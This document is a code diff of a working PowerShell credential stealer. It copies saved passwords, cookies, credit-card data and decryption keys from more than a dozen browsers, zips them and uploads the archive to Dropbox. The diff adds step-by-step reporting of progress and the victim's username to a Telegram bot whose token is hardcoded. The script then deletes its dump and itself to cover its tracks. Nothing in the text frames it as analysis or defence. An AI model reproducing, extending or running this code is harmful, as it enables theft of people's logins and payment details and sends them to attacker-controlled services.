@@ -35,18 +35,35 @@ if (Test-Path "$($ENV:LOCALAPPDATA)\Dump.zip") {
 
 New-Item "$($ENV:LOCALAPPDATA)\Dump" -itemType Directory
 
+$global:msglogid = ''
+$global:log = @('')
+
 Function TelegramLog{
     param(
         [String] $text
     )
 
-    $endpoint = "https://api.telegram.org/bot6078810305:AAFgG6ZB4eqhpzrT2GzRnzOSN40IsO-X5oQ/sendMessage"
+    $date = Get-Date -Format 'dd/MM/yyyy HH:mm'
 
-    $postParams = @{chat_id='-1001795787010'; text=$text}
-    Invoke-WebRequest -Uri $endpoint -Method POST -Body $postParams
+    $newline = '[' + $date + "] " + $text
+    $global:log += $newline
+
+    if ($global:msglogid) {        
+        # EDIT MESSAGE
+        $endpoint = "https://api.telegram.org/bot6078810305:AAFgG6ZB4eqhpzrT2GzRnzOSN40IsO-X5oQ/editMessageText"
+        $logtostring = $global:log | out-string
+        $postParams = @{chat_id='-1001795787010'; message_id=$global:msglogid; text='LOG: ' + $env:UserName + '/PC ```' + $logtostring + '```'; parse_mode='MarkdownV2'}
+        $response = Invoke-RestMethod -Uri $endpoint -Method POST -Body $postParams
+    }else{
+        #SEND MESSAGE
+        $endpoint = "https://api.telegram.org/bot6078810305:AAFgG6ZB4eqhpzrT2GzRnzOSN40IsO-X5oQ/sendMessage"
+        $postParams = @{chat_id='-1001795787010'; text='LOG: ' + $env:UserName + '/PC ```' + $newline + '```'; parse_mode='MarkdownV2'}
+        $response = Invoke-RestMethod -Uri $endpoint -Method POST -Body $postParams
+        $global:msglogid = $response.result.message_id
+    }
 }
 
-TelegramLog "[+] Script started"
+TelegramLog "Script started"
 
 Function DumpEdge{
     
@@ -62,6 +79,8 @@ Function DumpEdge{
         $fileChromiumExtension    = $edgeProfilePath + "Extensions"
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Edge" -itemType Directory
+
+        TelegramLog "Edge found. Dumping..."
 
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Edge\Web Data"
@@ -92,6 +111,8 @@ Function DumpChrome{
 
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Chrome" -itemType Directory
 
+        TelegramLog "Chrome found. Dumping..."
+
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Web Data"
         Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Chrome\Login Data"
@@ -114,6 +135,8 @@ Function DumpYandex{
         $fileYandexCredit   = $yandexProfilePath + "Ya Credit Cards"
 
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Yandex" -itemType Directory
+
+        TelegramLog "Yandex found. Dumping..."
 
         Copy-Item -Path $fileYandexPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Yandex\Ya Passman Data"
         Copy-Item -Path $fileYandexCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Yandex\Ya Credit Cards"
@@ -138,6 +161,8 @@ Function DumpFirefox{
             $fileFirefoxExtension    = $firefoxProfilePath + $_.Name + "\extensions.json"
 
             New-Item "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)" -itemType Directory
+
+            TelegramLog "Firefox found. Dumping..."
 
             Copy-Item -Path $fileFirefoxKey4 -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\key4.db"
             Copy-Item -Path $fileFirefoxCookie -Destination "$($ENV:LOCALAPPDATA)\Dump\Firefox\Profiles\$($_.Name)\cookies.sqlite"
@@ -166,6 +191,8 @@ Function DumpChromeBeta{
         $fileChromiumExtension    = $chromeBetaUserDataPath + "Extensions"
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta" -itemType Directory
+
+        TelegramLog "ChromeBeta found. Dumping..."
 
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\ChromeBeta\Web Data"
@@ -196,6 +223,8 @@ Function DumpChromium{
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Chromium" -itemType Directory
 
+        TelegramLog "Chromium found. Dumping..."
+
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Web Data"
         Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Chromium\Login Data"
@@ -224,6 +253,8 @@ Function DumpBrave{
         $fileChromiumExtension    = $braveProfilePath + "Extensions"
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Brave" -itemType Directory
+
+        TelegramLog "Brave found. Dumping..."
 
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Brave\Web Data"
@@ -254,6 +285,8 @@ Function DumpSpeed360{
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Speed360" -itemType Directory
 
+        TelegramLog "Speed360 found. Dumping..."
+
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Web Data"
         Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Speed360\Login Data"
@@ -282,6 +315,8 @@ Function DumpQQBrowser{
         $fileChromiumExtension    = $qqBrowserProfilePath + "Extensions"
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\QQBrowser" -itemType Directory
+
+        TelegramLog "QQBrowser found. Dumping..."
 
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\QQBrowser\Web Data"
@@ -312,6 +347,8 @@ Function DumpOpera{
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Opera" -itemType Directory
 
+        TelegramLog "Opera found. Dumping..."
+
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Web Data"
         Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Opera\Login Data"
@@ -340,6 +377,8 @@ Function DumpOperaGX{
         $fileChromiumExtension    = $operaGXProfilePath + "Extensions"
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\OperaGX" -itemType Directory
+
+        TelegramLog "OperaGX found. Dumping..."
 
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\OperaGX\Web Data"
@@ -370,6 +409,8 @@ Function DumpVivaldi{
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Vivaldi" -itemType Directory
 
+        TelegramLog "Vivaldi found. Dumping..."
+
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Web Data"
         Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Vivaldi\Login Data"
@@ -399,6 +440,8 @@ Function DumpCoccoc{
         
         New-Item "$($ENV:LOCALAPPDATA)\Dump\Coccoc" -itemType Directory
 
+        TelegramLog "Coccoc found. Dumping..."
+
         Copy-Item -Path $fileChromiumKey -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Local State"
         Copy-Item -Path $fileChromiumCredit -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Web Data"
         Copy-Item -Path $fileChromiumPassword -Destination "$($ENV:LOCALAPPDATA)\Dump\Coccoc\Login Data"
@@ -412,6 +455,7 @@ Function DumpCoccoc{
                 
     }
 }
+
 
 DumpChrome
 DumpChromeBeta
@@ -427,8 +471,13 @@ DumpCoccoc
 DumpYandex
 DumpFirefox
 
+TelegramLog "Zipping folder..."
 Compress-Archive -Path "$($ENV:LOCALAPPDATA)\Dump" -DestinationPath "$($ENV:LOCALAPPDATA)\Dump.zip"
+
+TelegramLog "Deleting Dump folder..."
 Remove-Item "$($ENV:LOCALAPPDATA)\Dump" -Recurse
+
+
 
 <#
 
@@ -444,6 +493,10 @@ Function UploadFile{
         [String] $access_token
     )
 
+
+
+    TelegramLog "Uploading dump.zip..."
+
     $dumpfile = "$($ENV:LOCALAPPDATA)\Dump.zip"
     $DropboxTargetPath = "/dump_$($env:UserName).zip"
     $endpoint = "https://content.dropboxapi.com/2/files/upload"
@@ -457,6 +510,12 @@ Function UploadFile{
     $headers.Add("Content-Type", 'application/octet-stream')
 
     $response = Invoke-RestMethod -Uri $endpoint -Method Post -InFile $dumpfile -Headers ${headers}
+
+    if ($response.name){
+        TelegramLog "Upload success"
+    }else{
+        TelegramLog "Upload error!"
+    }
 
     return $response
 }
@@ -487,17 +546,31 @@ Function GetAccessToken{
         "--$boundary--$LF" 
     ) -join $LF
     
+    TelegramLog "Getting Dropbox access token..."
+
+    
     $response = Invoke-RestMethod -Uri $endpoint -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+ 
+    if ($response.access_token){
+        TelegramLog "Successfully obtained access token!"
+    }else{
+        TelegramLog "Error getting access token!"
+    }
 
     return $response.access_token
+    
 }
 
-TelegramLog "[+] Uploading dump.zip..."
+
 $access_token = GetAccessToken
 UploadFile $access_token
 
-
+TelegramLog "Deleting dump.zip..."
 Remove-Item "$($ENV:LOCALAPPDATA)\Dump.zip"
+
+TelegramLog "Deleting script.ps1..."
 Remove-Item $PSCommandPath
-TelegramLog "[+] Script finished"
+
+TelegramLog "Script finished!"
+
 
